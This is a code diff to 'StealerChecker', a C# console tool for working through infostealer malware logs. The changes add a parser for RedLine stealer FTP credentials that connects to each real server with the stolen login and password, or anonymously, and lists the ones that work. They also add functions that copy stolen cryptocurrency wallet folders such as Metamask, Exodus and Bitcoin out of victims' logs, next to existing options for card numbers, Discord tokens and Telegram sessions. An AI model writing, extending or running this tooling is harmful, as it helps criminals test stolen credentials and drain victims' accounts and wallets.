@@ -18,6 +18,7 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using TemnijExt;
+using static stealerchecker.Program;
 using Console = Colorful.Console;
 
 namespace stealerchecker
@@ -41,7 +42,7 @@ namespace stealerchecker
 
         #region FIELDS
 
-        internal static string tag = "7.8";
+        internal static string tag = "8.0";
         internal static string caption = $"StealerChecker v{tag} by Temnij";
         internal static string path;
         internal static readonly List<string> files = new();
@@ -55,7 +56,7 @@ namespace stealerchecker
 
         private static void Main(string[] args)
         {
-            //Update();
+            // Update();
             SetStatus();
             #region ARGUMENT PARSING
 
@@ -64,6 +65,10 @@ namespace stealerchecker
 
             if (string.IsNullOrEmpty(path))
             {
+                Console.WriteLine("Проблемы?\n" +
+                    "1. Создайте файл start.cmd в этой же папке\n" +
+                    "2. Пропишите в нём: stealerchecker.exe -p c:/путь/до/папки/с/логами\n" +
+                    "3. Кликните по нему два раза", Color.Red);
                 Console.ReadKey();
                 Environment.Exit(-1);
             }
@@ -173,14 +178,14 @@ namespace stealerchecker
 
                     if (fileZila)
                     {
-                        Console.Write($"[{file}]", Color.Green);
+                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                         Console.WriteLine(" - FileZila");
 
                         WriteFileZila(file);
                     }
                     if (totalCmd)
                     {
-                        Console.Write($"[{file}]", Color.Green);
+                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                         Console.WriteLine(" - Total Commander");
 
                         Console.WriteLine(WriteTotalCmd(file));
@@ -196,20 +201,36 @@ namespace stealerchecker
 
                     if (fileZila)
                     {
-                        Console.Write($"[{file}]", Color.Green);
+                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                         Console.WriteLine(" - FileZila");
 
                         WriteFileZila(file);
                     }
                     if (totalCmd)
                     {
-                        Console.Write($"[{file}]", Color.Green);
+                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                         Console.WriteLine(" - Total Commander");
 
                         Console.WriteLine(WriteTotalCmd(file));
                     }
                 }
+                else if (Path.GetFileName(file) == "UserInformation.txt")
+                {
+                    var logFolder = new FileInfo(file).Directory.FullName;
+                    if (Directory.Exists(Path.Combine(logFolder, "FTP"))
+                        && File.Exists(Path.Combine(logFolder, "FTP", "Credentials.txt")))
+                    {
+                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
+                        Console.WriteLine(" - RedLine FTP");
+
+                        CheckRedlineFtp(File.ReadAllText(Path.Combine(logFolder, "FTP", "Credentials.txt")));
+                    }
+                }
             }
+
+            Console.WriteLine($"Good FTPs:\n{string.Join(Environment.NewLine, goodFTPs.Distinct())}", Color.LightGreen);
+            goodFTPs.Clear();
+
             SetStatus();
         }
         internal static void WriteFileZila(string path)
@@ -226,6 +247,7 @@ namespace stealerchecker
                 Console.WriteLine();
             }
         }
+        static List<string> goodFTPs = new();
         internal static void CheckFileZilla(string fileZillaLog)
         {
             const string pattern = @"Host: (.*)\s*Port: (.*)\s*User: (.*)\s*Pass: (.*)";
@@ -254,6 +276,7 @@ namespace stealerchecker
                     client.Disconnect();
 
                     Console.WriteLine($"{Host}:{Port};{User}:{Pass} - GOOD", Color.LightGreen);
+                    goodFTPs.Add($"{Host}:{Port};{User}:{Pass} - GOOD");
                 }
                 catch (FtpAuthenticationException)
                 {
@@ -273,7 +296,68 @@ namespace stealerchecker
                         client.Connect();
                         client.Disconnect();
 
-                        Console.WriteLine($"{Host}:{Port};anonymous: - GOOD (ANON)", Color.LightGreen);
+                        Console.WriteLine($"{Host}:{Port};anonymous: - GOOD", Color.LightGreen);
+                    }
+                    catch
+                    {
+                        Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
+                    }
+                }
+                catch
+                {
+                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
+                }
+            }
+        }
+        internal static void CheckRedlineFtp(string redLineLog)
+        {
+            const string pattern = @"Server: (.*):(.*)\s*Username: (.*)\s*Password: (.*)\s*";
+            foreach (Match match in Regex.Matches(redLineLog, pattern))
+            {
+                string
+                    Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
+                    Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
+                    User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
+                    Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "");
+
+                try
+                {
+                    SetStatus($"Checking {Host}...");
+                    FtpClient client = new(Host)
+                    {
+                        Port = int.Parse(Port),
+                        Credentials = new NetworkCredential(User, Pass),
+                        ConnectTimeout = 5000,
+                        DataConnectionConnectTimeout = 5000,
+                        DataConnectionReadTimeout = 5000,
+                        ReadTimeout = 5000
+                    };
+
+                    client.Connect();
+                    client.Disconnect();
+
+                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - GOOD", Color.LightGreen);
+                    goodFTPs.Add($"{Host}:{Port};{User}:{Pass} - GOOD");
+                }
+                catch (FtpAuthenticationException)
+                {
+                    try
+                    {
+                        SetStatus($"Checking for anonymous auth {Host}...");
+                        FtpClient client = new(Host)
+                        {
+                            Port = int.Parse(Port),
+                            Credentials = new NetworkCredential("anonymous", ""),
+                            ConnectTimeout = 5000,
+                            DataConnectionConnectTimeout = 5000,
+                            DataConnectionReadTimeout = 5000,
+                            ReadTimeout = 5000
+                        };
+
+                        client.Connect();
+                        client.Disconnect();
+
+                        Console.WriteLine($"{Host}:{Port};anonymous: - GOOD", Color.LightGreen);
                     }
                     catch
                     {
@@ -465,18 +549,18 @@ namespace stealerchecker
         internal static void GetTelegram()
         {
             if (!Directory.Exists("Telegram"))
-            {
-                foreach (var file in files)
-                {
-                    var match = Regex.Match(File.ReadAllText(file), "✈️ Telegram: (❌|✅)");
+                Directory.CreateDirectory("Telegram");
 
-                    if (match.Groups[1].Value == "✅")
-                        CopyTelegram(file);
-                }
+            foreach (var file in files)
+            {
+                var match = Regex.Match(File.ReadAllText(file), "✈️ Telegram: (❌|✅)");
+
+                if (match.Groups[1].Value == "✅")
+                    CopyTelegram(file);
             }
             SetStatus();
 
-        again:
+            again:
             var dirs = new List<string>();
             foreach (var dir in Directory.GetDirectories("Telegram"))
                 dirs.Add(new DirectoryInfo(dir).Name);
@@ -523,6 +607,12 @@ namespace stealerchecker
 
         private static void CopyFilesRecursively(string sourcePath, string targetPath)
         {
+            try
+            {
+                if (!Directory.Exists(targetPath))
+                    Directory.CreateDirectory(targetPath);
+            }
+            catch { }
             foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
                 Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));
 
@@ -841,120 +931,62 @@ namespace stealerchecker
 
         internal static void PrintSearchMenu()
         {
-            Console.Clear();
-            Console.WriteLine("Searhing", Color.Pink);
-            Console.WriteLine();
-            Console.WriteLine("1. Search by URL", Color.LightCyan);
-            Console.WriteLine("2. Search by Password", Color.LightCyan);
-            Console.WriteLine("3. Search by Username", Color.LightCyan);
-            Console.WriteLine();
-            Console.WriteLine("55. back <--", Color.Cyan);
-
-            var selection = 0;
-            try
+            var SearchMenu = new Menu()
             {
-                selection = int.Parse(Console.ReadLine());
-            }
-            catch
-            {
-                Console.Clear();
-                PrintSearchMenu();
-            }
-
-            Console.WriteLine();
-            switch (selection)
-            {
-                case 1:
-                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
-                    SearchByURL(Console.ReadLine());
-                    break;
-                case 2:
-                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
-                    SearchByPass(Console.ReadLine());
-                    break;
-                case 3:
-                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
-                    SearchByUsername(Console.ReadLine());
-                    break;
-
-                case 55:
-                    Console.Clear();
-                    PrintMainMenu();
-                    break;
-                default: PrintSearchMenu(); break;
-            }
+                menu = new Dictionary<string, Action>()
+                {
+                    { "Search by URL", () => SearchByURL(Ext.input("Enter query", Color.LightSkyBlue)) },
+                    { "Search by Password", () => SearchByPass(Ext.input("Enter query", Color.LightSkyBlue)) },
+                    { "Search by Username", () => SearchByUsername(Ext.input("Enter query", Color.LightSkyBlue)) }
+                }.ToList(),
+                Name = "Searhing"
+            };
+            SearchMenu.Print();
         }
         internal static void PrintSortMenu()
         {
-            Console.Clear();
-            Console.WriteLine("Sorting", Color.Pink);
-            Console.WriteLine();
-            Console.WriteLine("1. Sort by date", Color.LightCyan);
-            Console.WriteLine("2. Sort login:pass by categories", Color.LightCyan);
-            Console.WriteLine();
-            Console.WriteLine("55. back <--", Color.Cyan);
-
-            var selection = 0;
-            try
+            var SortMenu = new Menu()
             {
-                selection = int.Parse(Console.ReadLine());
-            }
-            catch
-            {
-                Console.Clear();
-                PrintSortMenu();
-            }
-
-            Console.WriteLine();
-            switch (selection)
-            {
-                case 1: SortLogs(); break;
-                case 2: SortLogsbyCategories(); break;
-
-                case 55:
-                    Console.Clear();
-                    PrintMainMenu();
-                    break;
-                default: PrintSortMenu(); break;
-            }
+                menu = new Dictionary<string, Action>()
+                {
+                    { "Sort by date", () => SortLogs() },
+                    { "Sort login:pass by categories", () => SortLogsbyCategories() }
+                }.ToList(),
+                Name = "Sorting"
+            };
+            SortMenu.Print();
         }
         internal static void PrintGetMenu()
         {
-            Console.Clear();
-            Console.WriteLine("Getting", Color.Pink);
-            Console.WriteLine();
-            Console.WriteLine("1. Get CC cards", Color.LightCyan);
-            Console.WriteLine("2. Get&Check FTP servers", Color.LightCyan);
-            Console.WriteLine("3. Get Discord tokens", Color.LightCyan);
-            Console.WriteLine("4. Get Telegrams", Color.LightCyan);
-            Console.WriteLine();
-            Console.WriteLine("55. back <--", Color.Cyan);
-
-            var selection = 0;
-            try
+            var GetMenu = new Menu()
             {
-                selection = int.Parse(Console.ReadLine());
-            }
-            catch
+                menu = new Dictionary<string, Action>()
+                {
+                    { "Get CC cards", () => GetCC() },
+                    { "Get&Check FTP servers", () => GetFTP() },
+                    { "Get Discord tokens", () => GetDiscord() },
+                    { "Get Telegrams", () => GetTelegram() },
+                    { "Get Cold Wallets", () => PrintWalletsMenu() },
+                }.ToList(),
+                Name = "Getting"
+            };
+            GetMenu.Print();
+        }
+        internal static void PrintWalletsMenu()
+        {
+            var WalletsMenu = new Menu()
             {
-                Console.Clear();
-                PrintGetMenu();
-            }
-
-            Console.WriteLine();
-            switch (selection)
-            {
-                case 1: GetCC(); break;
-                case 2: GetFTP(); break;
-                case 3: GetDiscord(); break;
-                case 4: GetTelegram(); break;
-
-                case 55:
-                    Console.Clear();
-                    PrintMainMenu();
-                    break;
-                default: PrintGetMenu(); break;
-            }
+                menu = new Dictionary<string, Action>()
+                {
+                    { "Get All Wallets", () => GetAllWallets() },
+                    { "Get Metamask Wallets", () => GetSpecWallets("Metamask") },
+                    { "Get Exodus Wallets", () => GetSpecWallets("Exodus") },
+                    { "Get Bitcoin Wallets", () => GetSpecWallets("Bitcoin") },
+                    { "Get DogeCoin Wallets", () => GetSpecWallets("Dogecoin") }
+                }.ToList(),
+                Name = "Cold Wallets"
+            };
+            WalletsMenu.Print();
         }
         internal static void PrintAnalysisMenu()
         {
@@ -967,8 +999,8 @@ namespace stealerchecker
             Console.WriteLine($"~{AnalyzeLoginInPass()}%", Color.DarkCyan);
             Console.Write("3. Username = password - ", Color.LightCyan);
             Console.WriteLine($"~{AnalyzeLoginEqualsPass()}%", Color.DarkCyan);
-            //Console.WriteLine("3. Most popular URLs:", Color.LightCyan);
-            //Console.WriteLine(AnalyzeMostPopularURLs(), Color.DarkCyan);
+            Console.WriteLine("4. Most popular URLs:", Color.LightCyan);
+            Console.WriteLine(AnalyzeMostPopularURLs(), Color.DarkCyan);
             Console.WriteLine();
             Console.WriteLine("55. back <--", Color.Cyan);
 
@@ -1033,6 +1065,11 @@ namespace stealerchecker
                 case 99: Environment.Exit(0); break;
             }
         }
+        public class Menu
+        {
+            public List<KeyValuePair<string, Action>> menu;
+            public string Name;
+        }
 
         #endregion
         #region ANALYSIS
@@ -1040,16 +1077,10 @@ namespace stealerchecker
         internal static string AnalyzeMostPopularURLs()
         {
             var top3 = new StringBuilder();
-            var percentages = new List<KeyValuePair<decimal, string>>();
-
-            glob.ForEach(x =>
-                percentages.Add(new KeyValuePair<decimal, string>(AnalyzePercentOfURL(x.Url), x.Url)));
-
-            percentages.Sort();
-
-            for (int i = 0; i < 3; i++)
-                top3.WriteLine($"{i + 1}. {percentages[i].Value} - {percentages[i].Key}");
-
+            var query = glob.GroupBy(x => x.Url)
+                            .Select(group => new { group.Key, Count = group.Count() })
+                            .OrderByDescending(x => x.Count);
+            foreach (var item in query.Take(5)) if (item.Key.Length > 3) top3.WriteLine($"\t{item.Key}");
             return top3.ToString();
         }
         internal static decimal AnalyzeLoginInPass()
@@ -1063,7 +1094,6 @@ namespace stealerchecker
         }
         internal static decimal AnalyzePercentOfURL(string url)
         {
-            SetStatus("Analyzing...");
             var count = glob
                 .Count(x => x.Url.IndexOf(url, StringComparison.OrdinalIgnoreCase) >= 0);
             SetStatus();
@@ -1127,7 +1157,7 @@ namespace stealerchecker
                 var content = "@echo off" + NewLine
                     + "timeout 2 > NUL" + NewLine
                     + $"move /Y stealerchecker_new.exe {currentName}.exe" + NewLine
-                   // + "del Update.rar" + NewLine
+                    // + "del Update.rar" + NewLine
                     + "del %~s0 /q";
                 File.WriteAllText("update.cmd", content);
 
@@ -1138,10 +1168,99 @@ namespace stealerchecker
         }
 
         #endregion
+        #region WALLETS
+
+        private static readonly List<string> wallets = new()
+        {
+            "Atomic",
+            "Exodus",
+            "Electrum",
+            "NetboxWallet",
+            "Monero",
+            "Bitcoin",
+            "Lobstex",
+            "Koto",
+            "Metamask",
+            "Dogecoin",
+            "HappyCoin",
+            "curecoin",
+            "BitcoinGod",
+            "BinanceChain",
+            "Tronlink",
+            "BitcoinCore",
+            "Armory",
+            "LitecoinCore"
+        };
+        static void GetAllWallets() { foreach (var wallet in wallets) GetSpecWallets(wallet); }
+        static void GetSpecWallets(string WalletName)
+        {
+            var withWallet = files
+                .Where(file => Directory.Exists(Path.Combine(new FileInfo(file).Directory.FullName, "Wallets", WalletName)))
+                .Select(file => new FileInfo(file).Directory.FullName);
+
+            if (!Directory.Exists(Path.Combine("Wallets", WalletName)))
+                Directory.CreateDirectory(Path.Combine("Wallets", WalletName));
+
+            int counter = 0;
+            foreach (var walletFolder in withWallet)
+            {
+                SetStatus($"Working... [{WalletName}] [{counter}/{withWallet.Count()}]");
+                CopyFilesRecursively(Path.Combine(walletFolder, "Wallets", WalletName), Path.Combine("Wallets", WalletName, new DirectoryInfo(walletFolder).Name));
+                counter++;
+            }
+
+            Console.WriteLine($"Sucsess [{WalletName}]!", Color.LightGreen);
+            SetStatus();
+        }
+
+        #endregion
     }
 
     internal static class Ext
     {
+        public static void Print(this Menu menu)
+        {
+            Console.Clear();
+            Console.WriteLine(menu.Name, Color.Pink);
+            Console.WriteLine();
+            foreach (var item in menu.menu)
+                Console.WriteLine($"{menu.menu.IndexOf(item) + 1}. {item.Key}", Color.LightCyan);
+            Console.WriteLine();
+            Console.WriteLine("55. back <--", Color.Cyan);
+
+            var selection = 0;
+            try
+            {
+                selection = int.Parse(Console.ReadLine());
+            }
+            catch
+            {
+                Print(menu);
+            }
+
+            Console.WriteLine();
+
+            if (selection == 55)
+            {
+                Console.Clear();
+                PrintMainMenu();
+            }
+
+            if (selection > menu.menu.Count || selection < 1)
+                Print(menu);
+            try
+            {
+                menu.menu[selection - 1].Value();
+            }
+            catch { Print(menu); }
+
+            PrintMainMenu();
+        }
         internal static void WriteLine(this StringBuilder builder, string value) => builder.Append(value).Append(Environment.NewLine);
+        public static string input(string text, Color color)
+        {
+            Console.WriteLine(text, color);
+            return Console.ReadLine();
+        }
     }
 }
